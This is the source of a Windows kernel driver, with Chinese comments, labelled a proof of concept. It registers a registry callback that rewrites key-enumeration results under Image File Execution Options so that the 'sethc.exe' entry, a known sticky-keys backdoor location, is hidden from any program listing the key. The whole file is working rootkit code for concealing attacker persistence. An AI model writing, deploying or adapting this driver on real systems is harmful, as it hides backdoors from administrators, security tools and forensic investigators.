#include <ntifs.h>
#include <Ntstatus.h>
#include <Ntdef.h>

typedef struct _CM_CALLBACK_CONTEXT
{
    ULONG MagicNumber;
    LARGE_INTEGER CallbackRegistrationCookie;
    BOOLEAN CallbackRegistered;
} CM_CALLBACK_CONTEXT, *PCM_CALLBACK_CONTEXT;

CM_CALLBACK_CONTEXT CmCallbackCmCallbackContext;

VOID Unload(PDRIVER_OBJECT DriverObject)
{
    UNREFERENCED_PARAMETER(DriverObject);

    // 記得在卸載時反註冊 Kernel Callback
    NTSTATUS status = CmUnRegisterCallback(CmCallbackCmCallbackContext.CallbackRegistrationCookie);
    ASSERT(NT_SUCCESS(status));
    return;
}

BOOLEAN GetNameFromEnumKeyPreInfo(KEY_INFORMATION_CLASS infoClass, PVOID infoBuffer, PUNICODE_STRING keyName)
{
    // 根據 KEY_INFORMATION_CLASS 分析不同結構
    switch (infoClass)
    {
        case KeyBasicInformation:
        {
            PKEY_BASIC_INFORMATION keyInfo = (PKEY_BASIC_INFORMATION)infoBuffer;
            keyName->Buffer = keyInfo->Name;
            keyName->Length = keyName->MaximumLength = (USHORT)keyInfo->NameLength;
        }
        break;
        case KeyNameInformation:
        {
            PKEY_NAME_INFORMATION keyInfo = (PKEY_NAME_INFORMATION)infoBuffer;
            keyName->Buffer = keyInfo->Name;
            keyName->Length = keyName->MaximumLength = (USHORT)keyInfo->NameLength;
        }
        break;
        default:
            return FALSE;
    }

    return TRUE;
}

NTSTATUS CmCallbackCmRegistryCallback(PVOID CallbackContext, PVOID Argument1, PVOID Argument2)
{
    UNREFERENCED_PARAMETER(CallbackContext);

    // 1. 在 CmCallback 處理 RegNtPostEnumerateKey
    // 根據 CmCallback 的類別做不同處理，這個 PoC 要處理的只有 RegNtPostEnumerateKey
    switch ((REG_NOTIFY_CLASS)PtrToUlong(Argument1))
    {
        case RegNtPostEnumerateKey:
        {
            PREG_POST_OPERATION_INFORMATION info = (PREG_POST_OPERATION_INFORMATION)Argument2;
            PCUNICODE_STRING regPath;
            UNICODE_STRING keyName;
            PREG_ENUMERATE_KEY_INFORMATION preInfo;
            if (!NT_SUCCESS(info->Status))
                return STATUS_SUCCESS;

            // 2. 取得當前處理的 Registry 的相關資訊
            // 取得當前處理的 Key 的 Registry Path
            if (!NT_SUCCESS(CmCallbackGetKeyObjectID(&CmCallbackCmCallbackContext.CallbackRegistrationCookie, info->Object,
                                                     NULL, &regPath)))
                return STATUS_SUCCESS;

            // 根據 KeyInformationClass 取得 keyName
            preInfo = (PREG_ENUMERATE_KEY_INFORMATION)info->PreInformation;
            if (!GetNameFromEnumKeyPreInfo(preInfo->KeyInformationClass, preInfo->KeyInformation, &keyName))
                return STATUS_SUCCESS;

            PVOID tempBuffer = (LPWSTR)ExAllocatePoolWithTag(PagedPool, preInfo->Length, 'hide');
            if (tempBuffer)
            {
                // 3. 比對當前處理的 Registry 是不是要隱藏的目標
                // 比對 Registry Path 是不是跟要隱藏的 Registry 相同
                if (!wcscmp(regPath->Buffer,
                            L"\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution "
                            L"Options"))
                {
                    // 比對 Key Name 的比對結果是不是大於等於 sethc.exe，
                    // 因為如果要隱藏 sethc.exe，之後的每一個 Registry 都要被它的下一個 Registry 取代
                    if (wcscmp(keyName.Buffer, L"sethc.exe") >= 0)
                    {
                        // 4. 如果是要隱藏的目標就用它的下一個 Registry 取代
                        // 取得當前的 Key 所在的 Registry Path 的 Object
                        HANDLE Key;
                        NTSTATUS status = ObOpenObjectByPointer(info->Object, OBJ_KERNEL_HANDLE, NULL, KEY_ALL_ACCESS,
                                                                *CmKeyObjectType, KernelMode, &Key);
                        if (!NT_SUCCESS(status))
                            return STATUS_SUCCESS;

                        // 取得下一個 Registry 的相關資訊
                        ULONG resLen;
                        status = ZwEnumerateKey(Key, preInfo->Index + 1, preInfo->KeyInformationClass, tempBuffer,
                                                preInfo->Length, &resLen);
                        if (!NT_SUCCESS(status))
                            return STATUS_SUCCESS;

                        if (!GetNameFromEnumKeyPreInfo(preInfo->KeyInformationClass, tempBuffer, &keyName))
                            return STATUS_SUCCESS;

                        // 把下一個 Registry 的 KeyInformation 取代當前 Registry 的 KeyInformation
                        RtlCopyMemory(preInfo->KeyInformation, tempBuffer, resLen);
                    }
                }
            }
        }
        default:
            break;
    }
    return STATUS_SUCCESS;
}

extern NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);
    NTSTATUS status;

    // 設定 Kernel Callback 監控 Registry 的行為，altitude 跟 Callback 執行的順序有關
    UNICODE_STRING altitude;
    RtlInitUnicodeString(&altitude, L"12345");
    status = CmRegisterCallbackEx(CmCallbackCmRegistryCallback, &altitude, DriverObject, &CmCallbackCmCallbackContext,
                                  &CmCallbackCmCallbackContext.CallbackRegistrationCookie, NULL);
    if (!NT_SUCCESS(status))
    {
        DbgPrint("CmRegisterCallback failed! Status 0x%x\n", status);
    }

    DriverObject->DriverUnload = Unload;
    return status;
}